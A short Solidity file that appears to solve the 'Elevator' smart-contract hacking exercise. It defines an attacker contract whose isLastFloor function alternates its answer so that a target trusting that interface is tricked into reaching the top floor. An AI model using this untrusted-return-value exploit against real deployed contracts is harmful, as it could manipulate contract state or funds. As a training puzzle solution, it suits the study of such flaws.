// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint) external;
}

contract ElevatorAttacker {
    bool public called;

    function isLastFloor(uint _floor) external returns (bool){
        called = !called; //true
        return !called; //false
    }

    function attack(uint _floor, address _elevator) external {
        Elevator(_elevator).goTo(_floor);
    }


}